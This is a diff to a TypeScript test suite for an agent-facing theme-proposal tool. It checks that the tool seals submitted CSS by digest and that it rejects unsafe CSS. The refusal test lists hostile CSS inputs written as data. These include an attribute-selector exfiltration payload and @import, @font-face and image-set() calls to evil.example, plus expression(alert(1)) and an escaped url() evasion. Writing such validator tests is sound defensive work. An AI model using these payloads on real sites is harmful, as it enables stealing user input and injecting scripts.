@@ -1,3 +1,6 @@
+// @effect-diagnostics-next-line nodeBuiltinImport:off -- the test computes the digest the browser checks.
+import * as NodeCrypto from "node:crypto";
+
 import { expect, it } from "@effect/vitest";
 import { EnvironmentId, ProviderInstanceId, ThreadId } from "@t3tools/contracts";
 import { THEME_PROPOSAL_GUIDE } from "@t3tools/shared/themeProposal";
@@ -15,6 +18,7 @@ import * as McpInvocationContext from "../../McpInvocationContext.ts";
 import * as McpToolAccess from "../../McpToolAccess.ts";
 import { liveThreadShell } from "../../McpToolAccess.testkit.ts";
 import * as ThemeHandlers from "./handlers.ts";
+import * as ThemeProposalSeal from "./themeProposalSeal.ts";
 import { ThemeToolkit } from "./tools.ts";
 
 const environmentId = EnvironmentId.make("environment:theme");
@@ -115,11 +119,73 @@ it.effect("returns a proposal for colors and writes nothing on the Hub", () =>
   ),
 );
 
-it.effect("refuses CSS, per-role colors, unknown keys and anything but #rrggbb", () =>
+const CSS =
+  '[data-chat-header] { background: #0b0f0c; } @keyframes pulse { to { opacity: 0.5 } } [data-slot="button"] { animation: pulse 2s infinite; }';
+const sha256 = (text: string) => NodeCrypto.createHash("sha256").update(text, "utf8").digest("hex");
+const SEAL_KEY = new Uint8Array(32).fill(7);
+
+it.effect("returns the CSS's size and digest with the Hub's seal, never the CSS itself", () =>
+  withToolkit(threadScope, (call) =>
+    Effect.gen(function* () {
+      ThemeProposalSeal.installThemeProposalSealKey(SEAL_KEY);
+      const result = yield* call("t3_theme_propose", { ...NIGHT, css: CSS });
+      const css = { length: CSS.length, sha256: sha256(CSS) };
+      expect(result).toMatchObject({ themeProposal: { ...NIGHT, css } });
+      const seal = (result as { themeProposalSeal: string }).themeProposalSeal;
+      expect(seal).toMatch(/^[A-Za-z0-9_-]{43}$/);
+      expect(ThemeProposalSeal.themeProposalSealValid({ ...NIGHT, css }, seal)).toBe(true);
+      // The agent already has its CSS; echoing it would cost its context and break compaction.
+      expect(JSON.stringify(result)).not.toContain("keyframes");
+      expect((result as { next: string }).next).toContain("CSS");
+    }),
+  ),
+);
+
+it.effect("refuses CSS that can load or send anything, escaped or not, and says why", () =>
+  withToolkit(threadScope, (call) =>
+    Effect.gen(function* () {
+      ThemeProposalSeal.installThemeProposalSealKey(SEAL_KEY);
+      for (const [css, word] of [
+        ['input[value^="a"] { background: url(https://evil.example/a) }', "url()"],
+        ['@import "https://evil.example/a.css";', "@import"],
+        ["@font-face { font-family: x; src: url(https://evil.example/f) }", "@font-face"],
+        [".x { src: local(Arial) }", "src:"],
+        ['.x { background: image-set("https://evil.example/a" 1x) }', "image-set()"],
+        [".x { width: expression(alert(1)) }", "expression()"],
+        [".x { behavior: url(a.htc) }", "behavior"],
+        [".x { -moz-binding: url(a.xml#b) }", "-moz-binding"],
+        [".x { background: u\\72l(https://evil.example/a) }", "backslash"],
+        [`/*${"x".repeat(50_000)}*/`, "50,000"],
+        ["   ", "empty"],
+      ] as const) {
+        expect(yield* refusal(call("t3_theme_propose", { ...NIGHT, css }))).toMatchObject({
+          code: "invalid_request",
+          message: expect.stringContaining(word),
+        });
+      }
+    }),
+  ),
+);
+
+it.effect("refuses CSS while the Hub has no key to seal it", () =>
+  withToolkit(threadScope, (call) =>
+    Effect.gen(function* () {
+      ThemeProposalSeal.installThemeProposalSealKey(null);
+      expect(yield* refusal(call("t3_theme_propose", { ...NIGHT, css: CSS }))).toMatchObject({
+        code: "invalid_request",
+      });
+      // Colors alone need no seal.
+      expect(yield* refusal(call("t3_theme_propose", NIGHT))).toBeUndefined();
+      ThemeProposalSeal.installThemeProposalSealKey(SEAL_KEY);
+    }),
+  ),
+);
+
+it.effect("refuses per-role colors, unknown keys and anything but #rrggbb", () =>
   withToolkit(threadScope, (call) =>
     Effect.gen(function* () {
       for (const params of [
-        { ...NIGHT, css: "[data-approval] { display: none }" },
+        { ...NIGHT, css: 42 },
         { ...NIGHT, colors: { text: "#0b0f0c" } },
         { ...NIGHT, variants: { light: { canvas: "#ffffff" } } },
         { ...NIGHT, canvas: "url(https://example.com/a)" },
